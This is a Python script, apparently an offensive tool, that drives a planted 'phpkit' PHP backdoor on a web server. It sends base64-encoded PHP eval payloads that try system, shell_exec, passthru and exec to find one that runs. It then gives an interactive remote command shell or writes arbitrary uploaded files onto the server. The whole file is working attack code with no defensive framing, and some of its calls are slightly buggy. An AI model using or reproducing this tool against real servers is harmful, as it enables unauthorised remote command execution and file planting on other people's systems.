#!/usr/bin/python
import argparse
import requests
import sys

help = """Connects to a phpkit backdoor and provides file upload or shell access"""
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--url", help="URL of backdoor", required=True)
parser.add_argument("--mode", help="UPLOAD or SHELL", default="SHELL")
parser.add_argument("--lfile", help="File to Upload (full path)")
parser.add_argument("--rfile", help="Where to put the file on the server (full path)")
args = parser.parse_args()

url = args.url
mode = args.mode
localfile = args.lfile
remotefile = args.rfile

tester = """echo w00tw00tw00t"""
testkey = """w00tw00tw00t"""
print "\n[+] URL in use: %s \n" %(url)

###                      ###
# Whole Bunch of Functions #
###                      ###
def genphp(func, cmd):
    if func == "system":
        rawphp = """system('%s');""" %(cmd)
    elif func == "shellexec":
        rawphp = """echo shell_exec('%s');""" %(cmd)
    elif func == "passthru":
        rawphp = """passthru('%s');""" %(cmd)
    elif func == "exec":
        rawphp = """echo exec('%s');""" %(cmd)
    encodedphp = rawphp.encode('base64')
    payload = """<?php eval(base64_decode('%s')); ?>""" %(encodedphp)
    return payload

def test(url, tester, testkey): # This whole function is ugly as sin
    print "[+] Testing system()" # I need to make it tighter
    payload = genphp('system', tester) # No, really. Look at the waste
    r = requests.post(url, payload) # It could be TIIINY and fast!
    if testkey in r.text:
        print "[+] system() works, using system."
        func = 'system'
        return func
    else:
        print "[-] system() seems disabled :("
        pass
    print "[+] Testing shell_exec()" # LOOK AT THE FORKING CODE REUSE
    payload = genphp('shellexec', tester) # THIS COULD BE TINY
    r = requests.post(url, payload)  # But. Coffee is lacking
    if testkey in r.text:
        print "[+] shell_exec() works, using shell_exec"
        func = 'shellexec'
        return func
    else:
        print "[-] shell_exec() seems disabled :("
        pass
    print "[+] Testing passthru()"
    payload = genphp('passthru', tester)
    r = requests.post(url, payload)
    if testkey in r.text:
        print "[+] passthru() works, using passthru"
        func = 'passthru'
        return func
    else:
        print "[-] passthru() seems disabled :("
        pass
    print "[+] Testing exec()"
    payload = genphp('exec', tester)
    r = requests.post(url, payload)
    if testkey in r.text:
        print "[+] exec() works, using exec"
        func = 'exec'
        return func
    else:
        print "[-] exec() seems disabled :("
        pass

###
def shell(func):
    func = test(url, tester, testkey)
    while True:
        try:
            cmd = raw_input("shell:~$ ")
            if cmd == "quit":
                print "\n[-] Quitting"
                sys.exit(0)
            elif cmd == "exit":
                print "\n[-] Quitting"
                sys.exit(0)
            else:
                try:
                    payload = genphp(func, cmd)
                    hax = requests.post(url, payload)
                    print hax.text
                except Exception or KeyboardInterrupt:
                    print "[-] Exception Caught, I hope"
                    sys.exit(0)
        except Exception or KeyboardInterrupt:
            print "[-] Exception or CTRL+C Caught, I hope"
            print "[-] Exiting (hopefully) cleanly..."
            sys.exit(0)

def upload(url, localfile, remotefile):
    f = open(localfile, "r")
    rawfiledata = f.read()
    encodedfiledata = rawfiledata.encode('base64')
    phppayload = """<?php
    $f = fopen("%s", "a");
    $x = base64_decode('%s');
    fwrite($f, "$x");
    fclose($f);
    ?>""" %(remotefile, encodedfiledata) # I need to add a hashing function sometime for corruption test.

    print "[+] Uploading File"
    requests.post(url, phppayload) # this is why I love the python requests library
    print "[+] Upload should be complete"
    sys.exit(0)

def main(url, localfile, remotefile, mode):
    if mode == "UPLOAD":
        upload(url, localfile, remotefile)
    elif mode == "SHELL":
        func = test(url, test, testkey)
        shell(func)
    else:
        print "[-] Mode Invalid... Exit!"
        sys.exit(0)

main(url, localfile, remotefile, mode)
